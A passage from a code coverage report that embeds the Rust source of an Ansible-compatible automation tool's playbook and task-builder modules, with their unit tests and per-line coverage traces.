Vec\u003cString\u003e,\n\n    /// Become settings\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub r#become: Option\u003cbool\u003e,\n\n    /// Other settings\n    #[serde(flatten)]\n    pub other: IndexMap\u003cString, serde_yaml::Value\u003e,\n}\n\n/// Include types for importing external files\n#[derive(Debug, Clone, Serialize, Deserialize)]\n#[serde(rename_all = \"snake_case\")]\npub enum IncludeType {\n    /// Import playbook (static)\n    ImportPlaybook(String),\n    /// Include tasks (dynamic)\n    IncludeTasks(String),\n    /// Import tasks (static)\n    ImportTasks(String),\n    /// Include role (dynamic)\n    IncludeRole(RoleSpec),\n    /// Import role (static)\n    ImportRole(RoleSpec),\n    /// Include vars\n    IncludeVars(String),\n}\n\n/// Builder for creating tasks\n#[derive(Debug, Default)]\npub struct TaskBuilder {\n    name: String,\n    module: Option\u003cString\u003e,\n    args: IndexMap\u003cString, serde_yaml::Value\u003e,\n    when: Vec\u003cString\u003e,\n    register: Option\u003cString\u003e,\n    notify: Vec\u003cString\u003e,\n    tags: Vec\u003cString\u003e,\n    r#become: Option\u003cbool\u003e,\n    ignore_errors: bool,\n    loop_over: Option\u003cLoopSpec\u003e,\n}\n\nimpl TaskBuilder {\n    /// Create a new task builder\n    pub fn new(name: impl Into\u003cString\u003e) -\u003e Self {\n        Self {\n            name: name.into(),\n            ..Default::default()\n        }\n    }\n\n    /// Set the module\n    pub fn module(mut self, module: impl Into\u003cString\u003e) -\u003e Self {\n        self.module = Some(module.into());\n        self\n    }\n\n    /// Add an argument\n    pub fn arg(mut self, key: impl Into\u003cString\u003e, value: serde_yaml::Value) -\u003e Self {\n        self.args.insert(key.into(), value);\n        self\n    }\n\n    /// Add a when condition\n    pub fn when(mut self, condition: impl Into\u003cString\u003e) -\u003e Self {\n        self.when.push(condition.into());\n        self\n    }\n\n    /// Register result\n    pub fn register(mut self, var: impl Into\u003cString\u003e) -\u003e Self {\n        self.register = Some(var.into());\n        self\n    }\n\n    /// Add a notify handler\n    pub fn notify(mut self, handler: impl Into\u003cString\u003e) -\u003e Self {\n        self.notify.push(handler.into());\n        self\n    }\n\n    /// Add a tag\n    pub fn tag(mut self, tag: impl Into\u003cString\u003e) -\u003e Self {\n        self.tags.push(tag.into());\n        self\n    }\n\n    /// Enable become\n    pub fn r#become(mut self, r#become: bool) -\u003e Self {\n        self.r#become = Some(r#become);\n        self\n    }\n\n    /// Ignore errors\n    pub fn ignore_errors(mut self, ignore: bool) -\u003e Self {\n        self.ignore_errors = ignore;\n        self\n    }\n\n    /// Add a loop\n    pub fn loop_items(mut self, items: Vec\u003cserde_yaml::Value\u003e) -\u003e Self {\n        self.loop_over = Some(LoopSpec::List(items));\n        self\n    }\n\n    /// Build the task\n    pub fn build(self) -\u003e Task {\n        let mut task = Task::new(self.name);\n\n        if let Some(module) = self.module {\n            if self.args.is_empty() {\n                task.module.insert(module, serde_yaml::Value::Null);\n            } else {\n                let mut map = serde_yaml::Mapping::new();\n                for (k, v) in self.args {\n                    map.insert(serde_yaml::Value::String(k), v);\n                }\n                task.module.insert(module, serde_yaml::Value::Mapping(map));\n            }\n        }\n\n        task.when_condition = self.when;\n        task.register = self.register;\n        task.notify = self.notify;\n        task.tags = self.tags;\n        task.r#become = self.r#become;\n        task.ignore_errors = self.ignore_errors;\n        task.loop_over = self.loop_over;\n\n        task\n    }\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n\n    #[test]\n    fn test_playbook_new() {\n        let playbook = Playbook::new();\n        assert_eq!(playbook.play_count(), 0);\n    }\n\n    #[test]\n    fn test_play_new() {\n        let play = Play::new(\"webservers\");\n        assert_eq!(play.hosts, \"webservers\");\n        assert!(play.gather_facts);\n    }\n\n    #[test]\n    fn test_task_builder() {\n        let task = TaskBuilder::new(\"Install nginx\")\n            .module(\"apt\")\n            .arg(\"name\", serde_yaml::Value::String(\"nginx\".into()))\n            .arg(\"state\", serde_yaml::Value::String(\"present\".into()))\n            .r#become(true)\n            .notify(\"restart nginx\")\n            .build();\n\n        assert_eq!(task.name, \"Install nginx\");\n        assert_eq!(task.r#become, Some(true));\n        assert!(task.notify.contains(\u0026\"restart nginx\".to_string()));\n    }\n\n    #[test]\n    fn test_handler() {\n        let handler = Handler::with_module(\n            \"restart nginx\",\n            \"service\",\n            serde_yaml::Value::String(\"nginx state=restarted\".into()),\n        );\n\n        assert!(handler.responds_to(\"restart nginx\"));\n        assert!(!handler.responds_to(\"stop nginx\"));\n    }\n\n    #[test]\n    fn test_role_inclusion() {\n        let simple = RoleInclusion::Name(\"common\".to_string());\n        assert_eq!(simple.name(), \"common\");\n\n        let full = RoleInclusion::Full(RoleSpec::new(\"nginx\"));\n        assert_eq!(full.name(), \"nginx\");\n    }\n}\n","traces":[{"line":201,"address":[],"length":0,"stats":{"Line":0}},{"line":203,"address":[],"length":0,"stats":{"Line":0}},{"line":204,"address":[],"length":0,"stats":{"Line":0}},{"line":213,"address":[],"length":0,"stats":{"Line":0}},{"line":214,"address":[],"length":0,"stats":{"Line":0}},{"line":215,"address":[],"length":0,"stats":{"Line":0}},{"line":216,"address":[],"length":0,"stats":{"Line":0}},{"line":217,"address":[],"length":0,"stats":{"Line":0}},{"line":218,"address":[],"length":0,"stats":{"Line":0}},{"line":219,"address":[],"length":0,"stats":{"Line":0}},{"line":220,"address":[],"length":0,"stats":{"Line":0}},{"line":221,"address":[],"length":0,"stats":{"Line":0}},{"line":226,"address":[],"length":0,"stats":{"Line":0}},{"line":227,"address":[],"length":0,"stats":{"Line":0}},{"line":233,"address":[],"length":0,"stats":{"Line":0}},{"line":240,"address":[],"length":0,"stats":{"Line":0}},{"line":241,"address":[],"length":0,"stats":{"Line":0}},{"line":242,"address":[],"length":0,"stats":{"Line":0}},{"line":261,"address":[],"length":0,"stats":{"Line":0}},{"line":262,"address":[],"length":0,"stats":{"Line":0}},{"line":513,"address":[],"length":0,"stats":{"Line":0}},{"line":515,"address":[],"length":0,"stats":{"Line":0}},{"line":517,"address":[],"length":0,"stats":{"Line":0}},{"line":518,"address":[],"length":0,"stats":{"Line":0}},{"line":520,"address":[],"length":0,"stats":{"Line":0}},{"line":523,"address":[],"length":0,"stats":{"Line":0}},{"line":526,"address":[],"length":0,"stats":{"Line":0}},{"line":527,"address":[],"length":0,"stats":{"Line":0}},{"line":528,"address":[],"length":0,"stats":{"Line":0}},{"line":538,"address":[],"length":0,"stats":{"Line":0}},{"line":541,"address":[],"length":0,"stats":{"Line":0}},{"line":542,"address":[],"length":0,"stats":{"Line":0}},{"line":544,"address":[],"length":0,"stats":{"Line":0}},{"line":545,"address":[],"length":0,"stats":{"Line":0}},{"line":546,"address":[],"length":0,"stats":{"Line":0}},{"line":564,"address":[],"length":0,"stats":{"Line":0}},{"line":565,"address":[],"length":0,"stats":{"Line":0}},{"line":566,"address":[],"length":0,"stats":{"Line":0}},{"line":677,"address":[],"length":0,"stats":{"Line":0}},{"line":679,"address":[],"length":0,"stats":{"Line":0}},{"line":685,"address":[],"length":0,"stats":{"Line":0}},{"line":687,"address":[],"length":0,"stats":{"Line":0}},{"line":760,"address":[],"length":0,"stats":{"Line":0}},{"line":761,"address":[],"length":0,"stats":{"Line":0}},{"line":763,"address":[],"length":0,"stats":{"Line":0}},{"line":764,"address":[],"length":0,"stats":{"Line":0}},{"line":765,"address":[],"length":0,"stats":{"Line":0}},{"line":775,"address":[],"length":0,"stats":{"Line":0}},{"line":777,"address":[],"length":0,"stats":{"Line":0}},{"line":778,"address":[],"length":0,"stats":{"Line":0}},{"line":779,"address":[],"length":0,"stats":{"Line":0}},{"line":878,"address":[],"length":0,"stats":{"Line":0}},{"line":880,"address":[],"length":0,"stats":{"Line":0}},{"line":881,"address":[],"length":0,"stats":{"Line":0}},{"line":882,"address":[],"length":0,"stats":{"Line":0}},{"line":883,"address":[],"length":0,"stats":{"Line":0}},{"line":898,"address":[],"length":0,"stats":{"Line":0}},{"line":899,"address":[],"length":0,"stats":{"Line":0}},{"line":954,"address":[],"length":0,"stats":{"Line":0}},{"line":956,"address":[],"length":0,"stats":{"Line":0}},{"line":962,"address":[],"length":0,"stats":{"Line":0}},{"line":963,"address":[],"length":0,"stats":{"Line":0}},{"line":964,"address":[],"length":0,"stats":{"Line":0}},{"line":968,"address":[],"length":0,"stats":{"Line":0}},{"line":969,"address":[],"length":0,"stats":{"Line":0}},{"line":970,"address":[],"length":0,"stats":{"Line":0}},{"line":974,"address":[],"length":0,"stats":{"Line":0}},{"line":975,"address":[],"length":0,"stats":{"Line":0}},{"line":976,"address":[],"length":0,"stats":{"Line":0}},{"line":980,"address":[],"length":0,"stats":{"Line":0}},{"line":981,"address":[],"length":0,"stats":{"Line":0}},{"line":982,"address":[],"length":0,"stats":{"Line":0}},{"line":986,"address":[],"length":0,"stats":{"Line":0}},{"line":987,"address":[],"length":0,"stats":{"Line":0}},{"line":988,"address":[],"length":0,"stats":{"Line":0}},{"line":992,"address":[],"length":0,"stats":{"Line":0}},{"line":993,"address":[],"length":0,"stats":{"Line":0}},{"line":994,"address":[],"length":0,"stats":{"Line":0}}],"covered":0,"coverable":78},{"path":["/","home","artur","Repositories","rustible","src","playbook.rs"],"content":"//! Playbook definitions and parsing.\n//!\n//! This module provides types for representing Ansible-compatible playbooks\n//! with type-safe definitions and validation.\n\nuse serde::{Deserialize, Deserializer, Serialize};\nuse std::collections::HashMap;\nuse std::path::Path;\n\nuse crate::error::{Error, Result};\nuse crate::vars::Variables;\n\n/// Helper function for serde to check if Variables is empty\nfn is_vars_empty(vars: \u0026Variables) -\u003e bool {\n    vars.is_empty()\n}\n\n/// Deserialize a field that can be either a string or a vector of strings\nfn string_or_vec\u003c'de, D\u003e(deserializer: D) -\u003e std::result::Result\u003cVec\u003cString\u003e, D::Error\u003e\nwhere\n    D: Deserializer\u003c'de\u003e,\n{\n    use serde::de::{self, Visitor};\n    use std::fmt;\n\n    struct StringOrVec;\n\n    impl\u003c'de\u003e Visitor\u003c'de\u003e for StringOrVec {\n        type Value = Vec\u003cString\u003e;\n\n        fn expecting(\u0026self, formatter: \u0026mut fmt::Formatter) -\u003e fmt::Result {\n            formatter.write_str(\"string or list of strings\")\n        }\n\n        fn visit_str\u003cE\u003e(self, value: \u0026str) -\u003e std::result::Result\u003cSelf::Value, E\u003e\n        where\n            E: de::Error,\n        {\n            Ok(vec![value.to_string()])\n        }\n\n        fn visit_seq\u003cA\u003e(self, mut seq: A) -\u003e std::result::Result\u003cSelf::Value, A::Error\u003e\n        where\n            A: de::SeqAccess\u003c'de\u003e,\n        {\n            let mut vec = Vec::new();\n            while let Some(value) = seq.next_element()? {\n                vec.push(value);\n            }\n            Ok(vec)\n        }\n    }\n\n    deserializer.deserialize_any(StringOrVec)\n}\n\n/// A playbook containing one or more plays.\n///\n/// Playbooks are the top-level configuration files in Rustible.\n/// They contain a list of plays that define the automation workflow.\n#[derive(Debug, Clone, Serialize, Deserialize)]\npub struct Playbook {\n    /// Name of the playbook (optional, derived from filename if not set)\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub name: Option\u003cString\u003e,\n\n    /// The plays in this playbook\n    #[serde(flatten)]\n    pub plays: Vec\u003cPlay\u003e,\n\n    /// Path to the playbook file (set during loading)\n    #[serde(skip)]\n    pub source_path: Option\u003cstd::path::PathBuf\u003e,\n}\n\nimpl Playbook {\n    /// Loads a playbook from a YAML file.\n    pub async fn from_file(path: impl AsRef\u003cPath\u003e) -\u003e Result\u003cSelf\u003e {\n        let path = path.as_ref();\n        let content = tokio::fs::read_to_string(path).await.map_err(|e| {\n            Error::playbook_parse(path, format!(\"Failed to read file: {}\", e), None)\n        })?;\n\n        Self::from_yaml(\u0026content, Some(path.to_path_buf()))\n    }\n\n    /// Parses a playbook from a YAML string.\n    pub fn from_yaml(yaml: \u0026str, source_path: Option\u003cstd::path::PathBuf\u003e) -\u003e Result\u003cSelf\u003e {\n        // Playbooks are a list of plays at the top level\n        let plays: Vec\u003cPlay\u003e = serde_yaml::from_str(yaml).map_err(|e| {\n            Error::playbook_parse(\n                source_path\n                    .as_ref()\n                    .map_or(\"\u003cstring\u003e\".into(), |p| p.clone()),\n                e.to_string(),\n                None,\n            )\n        })?;\n\n        let name = source_path\n            .as_ref()\n            .and_then(|p| p.file_stem())\n            .map(|s| s.to_string_lossy().to_string());\n\n        Ok(Self {\n            name,\n            plays,\n            source_path,\n        })\n    }\n\n    /// Validates the playbook structure.\n    pub fn validate(\u0026self) -\u003e Result\u003c()\u003e {\n        if self.plays.is_empty() {\n            return Err(Error::PlaybookValidation(\n                \"Playbook must contain at least one play\".to_string(),\n            ));\n        }\n\n        for (idx, play) in self.plays.iter().enumerate() {\n            play.validate().map_err(|e| {\n                Error::PlaybookValidation(format!(\"Play {} validation failed: {}\", idx + 1, e))\n            })?;\n        }\n\n        Ok(())\n    }\n\n    /// Returns the number of plays.\n    pub fn play_count(\u0026self) -\u003e usize {\n        self.plays.len()\n    }\n\n    /// Returns total number of tasks across all plays.\n    pub fn task_count(\u0026self) -\u003e usize {\n        self.plays.iter().map(|p| p.tasks.len()).sum()\n    }\n}\n\n/// A play within a playbook.\n///\n/// A play maps a selection of hosts to tasks to be executed on those hosts.\n#[derive(Debug, Clone, Serialize, Deserialize)]\npub struct Play {\n    /// Name of the play\n    #[serde(default)]\n    pub name: String,\n\n    /// Host pattern to match against inventory\n    pub hosts: String,\n\n    /// Whether to gather facts before executing tasks\n    #[serde(default = \"default_gather_facts\")]\n    pub gather_facts: bool,\n\n    /// Subset of gathered facts\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub gather_subset: Option\u003cVec\u003cString\u003e\u003e,\n\n    /// Timeout for fact gathering in seconds\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub gather_timeout: Option\u003cu64\u003e,\n\n    /// Variables for this play\n    #[serde(default, skip_serializing_if = \"is_vars_empty\")]\n    pub vars: Variables,\n\n    /// Variable files to load\n    #[serde(default, skip_serializing_if = \"Vec::is_empty\")]\n    pub vars_files: Vec\u003cString\u003e,\n\n    /// Roles to apply\n    #[serde(default, skip_serializing_if = \"Vec::is_empty\")]\n    pub roles: Vec\u003cRoleRef\u003e,\n\n    /// Pre-tasks to run before roles\n    #[serde(default, skip_serializing_if = \"Vec::is_empty\")]\n    pub pre_tasks: Vec\u003cTask\u003e,\n\n    /// Tasks to run after roles\n    #[serde(default, skip_serializing_if = \"Vec::is_empty\")]\n    pub tasks: Vec\u003cTask\u003e,\n\n    /// Post-tasks to run after tasks\n    #[serde(default, skip_serializing_if = \"Vec::is_empty\")]\n    pub post_tasks: Vec\u003cTask\u003e,\n\n    /// Handlers that can be notified\n    #[serde(default, skip_serializing_if = \"Vec::is_empty\")]\n    pub handlers: Vec\u003cHandler\u003e,\n\n    /// Become configuration\n    #[serde(default, skip_serializing_if = \"Option::is_none\")]\n    pub r#become: Option\u003cbool\u003e,\n\n    #[serde(default, skip_serializing_if = \"Option::is_none\")]\n    pub become_user: Option\u003cString\u003e,\n\n    #[serde(default, skip_serializing_if = \"Option::is_none\")]\n    pub become_method: Option\u003cString\u003e,\n\n    /// Connection settings\n    #[serde(default, skip_serializing_if = \"Option::is_none\")]\n    pub connection: Option\u003cString\u003e,\n\n    /// Remote user\n    #[serde(default, skip_serializing_if = \"Option::is_none\")]\n    pub remote_user: Option\u003cString\u003e,\n\n    /// Port to connect on\n    #[serde(default, skip_serializing_if = \"Option::is_none\")]\n    pub port: Option\u003cu16\u003e,\n\n    /// Execution strategy\n    #[serde(default, skip_serializing_if = \"Option::is_none\")]\n    pub strategy: Option\u003cString\u003e,\n\n    /// Serial execution (batch size)\n    #[serde(default, skip_serializing_if = \"Option::is_none\")]\n    pub serial: Option\u003cSerialSpec\u003e,\n\n    /// Maximum failure percentage before aborting\n    #[serde(default, skip_serializing_if = \"Option::is_none\")]\n    pub max_fail_percentage: Option\u003cu8\u003e,\n\n    /// Whether to run handlers on failure\n    #[serde(default)]\n    pub force_handlers: bool,\n\n    /// Whether to ignore unreachable hosts\n    #[serde(default)]\n    pub ignore_unreachable: bool,\n\n    /// Module defaults\n    #[serde(default, skip_serializing_if = \"HashMap::is_empty\")]\n    pub module_defaults: HashMap\u003cString, serde_json::Value\u003e,\n\n    /// Environment variables\n    #[serde(default, skip_serializing_if = \"HashMap::is_empty\")]\n    pub environment: HashMap\u003cString, String\u003e,\n\n    /// Tags for filtering\n    #[serde(default, skip_serializing_if = \"Vec::is_empty\")]\n    pub tags: Vec\u003cString\u003e,\n}\n\nfn default_gather_facts() -\u003e bool {\n    true\n}\n\nimpl Play {\n    /// Creates a new play with the given name and host pattern.\n    pub fn new(name: impl Into\u003cString\u003e, hosts: impl Into\u003cString\u003e) -\u003e Self {\n        Self {\n            name: name.into(),\n            hosts: hosts.into(),\n            gather_facts: true,\n            gather_subset: None,\n            gather_timeout: None,\n            vars: Variables::new(),\n            vars_files: Vec::new(),\n            roles: Vec::new(),\n            pre_tasks: Vec::new(),\n            tasks: Vec::new(),\n            post_tasks: Vec::new(),\n            handlers: Vec::new(),\n            r#become: None,\n            become_user: None,\n            become_method: None,\n            connection: None,\n            remote_user: None,\n            port: None,\n            strategy: None,\n            serial: None,\n            max_fail_percentage: None,\n            force_handlers: false,\n            ignore_unreachable: false,\n            module_defaults: HashMap::new(),\n            environment: HashMap::new(),\n            tags: Vec::new(),\n        }\n    }\n\n    /// Validates the play structure.\n    pub fn validate(\u0026self) -\u003e Result\u003c()\u003e {\n        if self.hosts.is_empty() {\n            return Err(Error::PlaybookValidation(\n                \"Play must specify hosts\".to_string(),\n            ));\n        }\n\n        // Validate tasks\n        for task in self.all_tasks() {\n            task.validate()?;\n        }\n\n        // Validate handlers\n        for handler in \u0026self.handlers {\n            if handler.name.is_empty() {\n                return Err(Error::PlaybookValidation(\n                    \"Handler must have a name\".to_string(),\n                ));\n            }\n        }\n\n        Ok(())\n    }\n\n    /// Returns an iterator over all tasks (pre_tasks, tasks, post_tasks).\n    pub fn all_tasks(\u0026self) -\u003e impl Iterator\u003cItem = \u0026Task\u003e {\n        self.pre_tasks\n            .iter()\n            .chain(self.tasks.iter())\n            .chain(self.post_tasks.iter())\n    }\n\n    /// Returns the total number of tasks.\n    pub fn task_count(\u0026self) -\u003e usize {\n        self.pre_tasks.len() + self.tasks.len() + self.post_tasks.len()\n    }\n}\n\n/// Reference to a role with optional parameters.\n#[derive(Debug, Clone, Serialize, Deserialize)]\n#[serde(untagged)]\npub enum RoleRef {\n    /// Simple role name\n    Simple(String),\n\n    /// Role with configuration\n    Full {\n        /// Role name\n        role: String,\n\n        /// Role variables\n        #[serde(default, flatten)]\n        vars: HashMap\u003cString, serde_json::Value\u003e,\n\n        /// When condition\n        #[serde(skip_serializing_if = \"Option::is_none\")]\n        when: Option\u003cString\u003e,\n\n        /// Tags\n        #[serde(default, skip_serializing_if = \"Vec::is_empty\")]\n        tags: Vec\u003cString\u003e,\n    },\n}\n\nimpl RoleRef {\n    /// Returns the role name.\n    pub fn name(\u0026self) -\u003e \u0026str {\n        match self {\n            Self::Simple(name) =\u003e name,\n            Self::Full { role, .. } =\u003e role,\n        }\n    }\n}\n\n/// A task to execute.\n#[derive(Debug, Clone, Serialize, Deserialize)]\npub struct Task {\n    /// Name of the task\n    #[serde(default)]\n    pub name: String,\n\n    /// Module to execute (the key is the module name)\n    #[serde(flatten)]\n    pub module: TaskModule,\n\n    /// Conditional execution\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub when: Option\u003cWhen\u003e,\n\n    /// Loop over items\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub loop_: Option\u003cserde_json::Value\u003e,\n\n    /// Alternative loop syntax\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub with_items: Option\u003cserde_json::Value\u003e,\n\n    /// Register result in variable\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub register: Option\u003cString\u003e,\n\n    /// Variable to store results for loop\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub loop_control: Option\u003cLoopControl\u003e,\n\n    /// Handlers to notify on change\n    #[serde(\n        default,\n        skip_serializing_if = \"Vec::is_empty\",\n        deserialize_with = \"string_or_vec\"\n    )]\n    pub notify: Vec\u003cString\u003e,\n\n    /// Whether to ignore errors\n    #[serde(default)]\n    pub ignore_errors: bool,\n\n    /// Whether to ignore unreachable\n    #[serde(default)]\n    pub ignore_unreachable: bool,\n\n    /// Become settings\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub r#become: Option\u003cbool\u003e,\n\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub become_user: Option\u003cString\u003e,\n\n    /// Delegation\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub delegate_to: Option\u003cString\u003e,\n\n    /// Run once\n    #[serde(default)]\n    pub run_once: bool,\n\n    /// Changed when condition\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub changed_when: Option\u003cString\u003e,\n\n    /// Failed when condition\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub failed_when: Option\u003cString\u003e,\n\n    /// Tags\n    #[serde(default, skip_serializing_if = \"Vec::is_empty\")]\n    pub tags: Vec\u003cString\u003e,\n\n    /// Task-level variables\n    #[serde(default, skip_serializing_if = \"is_vars_empty\")]\n    pub vars: Variables,\n\n    /// Environment variables\n    #[serde(default, skip_serializing_if = \"HashMap::is_empty\")]\n    pub environment: HashMap\u003cString, String\u003e,\n\n    /// Async execution timeout\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub async_: Option\u003cu64\u003e,\n\n    /// Poll interval for async\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub poll: Option\u003cu64\u003e,\n\n    /// Number of retries\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub retries: Option\u003cu32\u003e,\n\n    /// Delay between retries in seconds\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub delay: Option\u003cu64\u003e,\n\n    /// Condition for retry success\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub until: Option\u003cString\u003e,\n}\n\nimpl Task {\n    /// Creates a new task.\n    pub fn new(\n        name: impl Into\u003cString\u003e,\n        module: impl Into\u003cString\u003e,\n        args: serde_json::Value,\n    ) -\u003e Self {\n        Self {\n            name: name.into(),\n            module: TaskModule {\n                name: module.into(),\n                args,\n            },\n            when: None,\n            loop_: None,\n            with_items: None,\n            register: None,\n            loop_control: None,\n            notify: Vec::new(),\n            ignore_errors: false,\n            ignore_unreachable: false,\n            r#become: None,\n            become_user: None,\n            delegate_to: None,\n            run_once: false,\n            changed_when: None,\n            failed_when: None,\n            tags: Vec::new(),\n            vars: Variables::new(),\n            environment: HashMap::new(),\n            async_: None,\n            poll: None,\n            retries: None,\n            delay: None,\n            until: None,\n        }\n    }\n\n    /// Validates the task.\n    pub fn validate(\u0026self) -\u003e Result\u003c()\u003e {\n        if self.module.name.is_empty() {\n            return Err(Error::PlaybookValidation(\n                \"Task must specify a module\".to_string(),\n            ));\n        }\n        Ok(())\n    }\n\n    /// Returns the module name.\n    pub fn module_name(\u0026self) -\u003e \u0026str {\n        \u0026self.module.name\n    }\n\n    /// Returns the module arguments.\n    pub fn module_args(\u0026self) -\u003e \u0026serde_json::Value {\n        \u0026self.module.args\n    }\n}\n\n/// Module invocation in a task.\n#[derive(Debug, Clone, Serialize)]\npub struct TaskModule {\n    /// Module name\n    #[serde(skip)]\n    pub name: String,\n\n    /// Module arguments\n    #[serde(flatten)]\n    pub args: serde_json::Value,\n}\n\nimpl\u003c'de\u003e Deserialize\u003c'de\u003e for TaskModule {\n    fn deserialize\u003cD\u003e(deserializer: D) -\u003e std::result::Result\u003cSelf, D::Error\u003e\n    where\n        D: Deserializer\u003c'de\u003e,\n    {\n        use serde::de::Error;\n        use serde_json::Value;\n\n        // Deserialize as a generic map\n        let mut map: HashMap\u003cString, Value\u003e = HashMap::deserialize(deserializer)?;\n\n        // Known task fields that aren't module names\n        let task_fields = [\n            \"name\",\n            \"when\",\n            \"loop\",\n            \"with_items\",\n            \"loop_control\",\n            \"notify\",\n            \"ignore_errors\",\n            \"failed_when\",\n            \"changed_when\",\n            \"tags\",\n            \"vars\",\n            \"environment\",\n            \"async\",\n            \"poll\",\n            \"register\",\n            \"until\",\n            \"retries\",\n            \"delay\",\n            \"become\",\n            \"become_user\",\n            \"delegate_to\",\n            \"run_once\",\n        ];\n\n        // Find the module name (first key that's not a task field)\n        let module_name = map\n            .keys()\n            .find(|k| !task_fields.contains(\u0026k.as_str()))\n            .cloned()\n            .ok_or_else(|| Error::custom(\"No module found in task\"))?;\n\n        // Extract module args\n        let args = map\n            .remove(\u0026module_name)\n            .unwrap_or(Value::Object(serde_json::Map::new()));\n\n        Ok(TaskModule {\n            name: module_name,\n            args,\n        })\n    }\n}\n\n/// Conditional expression.\n#[derive(Debug, Clone, Serialize, Deserialize)]\n#[serde(untagged)]\npub enum When {\n    /// Single condition\n    Single(String),\n    /// Multiple conditions (AND)\n    Multiple(Vec\u003cString\u003e),\n}\n\nimpl When {\n    /// Returns the conditions as a slice.\n    pub fn conditions(\u0026self) -\u003e Vec\u003c\u0026str\u003e {\n        match self {\n            Self::Single(s) =\u003e vec![s.as_str()],\n            Self::Multiple(v) =\u003e v.iter().map(String::as_str).collect(),\n        }\n    }\n}\n\n/// Loop control options.\n#[derive(Debug, Clone, Serialize, Deserialize)]\npub struct LoopControl {\n    /// Variable name for current item\n    #[serde(default = \"default_loop_var\")]\n    pub loop_var: String,\n\n    /// Variable name for item index\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub index_var: Option\u003cString\u003e,\n\n    /// Label for display\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub label: Option\u003cString\u003e,\n\n    /// Pause between iterations in seconds\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub pause: Option\u003cu64\u003e,\n\n    /// Extended loop info\n    #[serde(default)]\n    pub extended: bool,\n}\n\nfn default_loop_var() -\u003e String {\n    \"item\".to_string()\n}\n\n/// Serial execution specification.\n#[derive(Debug, Clone, Serialize, Deserialize)]\n#[serde(untagged)]\npub enum SerialSpec {\n    /// Fixed batch size\n    Fixed(usize),\n    /// Percentage of hosts\n    Percentage(String),\n    /// Progressive batch sizes\n    Progressive(Vec\u003cSerialSpec\u003e),\n}\n\n/// A handler (special task triggered by notifications).\n#[derive(Debug, Clone, Serialize, Deserialize)]\npub struct Handler {\n    /// Handler name (must match notify in tasks)\n    pub name: String,\n\n    /// The task to execute\n    #[serde(flatten)]\n    pub task: Task,\n\n    /// Listen to additional names\n    #[serde(default, skip_serializing_if = \"Vec::is_empty\")]\n    pub listen: Vec\u003cString\u003e,\n}\n\nimpl Handler {\n    /// Creates a new handler.\n    pub fn new(name: impl Into\u003cString\u003e, task: Task) -\u003e Self {\n        Self {\n            name: name.into(),\n            task,\n            listen: Vec::new(),\n        }\n    }\n\n    /// Returns all names this handler responds to.\n    pub fn trigger_names(\u0026self) -\u003e Vec\u003c\u0026str\u003e {\n        let mut names = vec![self.name.as_str()];\n        names.extend(self.listen.iter().map(String::as_str));\n        names\n    }\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n\n    #[test]\n    fn test_parse_simple_playbook() {\n        let yaml = r#\"\n- name: Test Play\n  hosts: all\n  tasks:\n    - name: Echo hello\n      command: echo hello\n\"#;\n        let result = Playbook::from_yaml(yaml, None);\n        assert!(result.is_ok());\n        let playbook = result.unwrap();\n        assert_eq!(playbook.plays.len(), 1);\n        assert_eq!(playbook.plays[0].name, \"Test Play\");\n    }\n}\n","traces":[{"line":14,"address":[27703872],"length":1,"stats":{"Line":0}},{"line":15,"address":[27703877],"length":1,"stats":{"Line":0}},{"line":19,"address":[28797808,28797840],"length":1,"stats":{"Line":0}},{"line":28,"address":[],"length":0,"stats":{"Line":0}},{"line":31,"address":[27707632],"length":1,"stats":{"Line":0}},{"line":32,"address":[27707657],"length":1,"stats":{"Line":0}},{"line":35,"address":[28805898,28805904,28805600],"length":1,"stats":{"Line":0}},{"line":39,"address":[28805647,28805885],"length":1,"stats":{"Line":0}},{"line":42,"address":[28804672,28805136,28805174,28805119,28804710,28805583],"length":1,"stats":{"Line":0}},{"line":46,"address":[28804745,28805158,28805209,28804694],"length":1,"stats":{"Line":0}},{"line":47,"address":[28804812,28805276,28804757,28805221],"length":1,"stats":{"Line":0}},{"line":48,"address":[28804978,28805547,28805442,28805083],"length":1,"stats":{"Line":0}},{"line":50,"address":[28805007,28805471],"length":1,"stats":{"Line":0}},{"line":54,"address":[28797825,28797857],"length":1,"stats":{"Line":0}},{"line":78,"address":[],"length":0,"stats":{"Line":0}},{"line":79,"address":[],"length":0,"stats":{"Line":0}},{"line":80,"address":[],"length":0,"stats":{"Line":0}},{"line":81,"address":[],"length":0,"stats":{"Line":0}},{"line":84,"address":[],"length":0,"stats":{"Line":0}},{"line":88,"address":[27706864,27707593,27707612],"length":1,"stats":{"Line":1}},{"line":90,"address":[28804447,28804144,28804441],"length":1,"stats":{"Line":2}},{"line":91,"address":[28804367],"length":1,"stats":{"Line":0}},{"line":92,"address":[28804187],"length":1,"stats":{"Line":0}},{"line":93,"address":[28804192],"length":1,"stats":{"Line":0}},{"line":94,"address":[28804656,28804249,28804640],"length":1,"stats":{"Line":0}},{"line":95,"address":[28804321],"length":1,"stats":{"Line":0}},{"line":102,"address":[28804601,28804592],"length":1,"stats":{"Line":1}},{"line":103,"address":[28804497,28804464],"length":1,"stats":{"Line":1}},{"line":105,"address":[27707403],"length":1,"stats":{"Line":1}},{"line":107,"address":[27707329],"length":1,"stats":{"Line":1}},{"line":108,"address":[27707368],"length":1,"stats":{"Line":1}},{"line":113,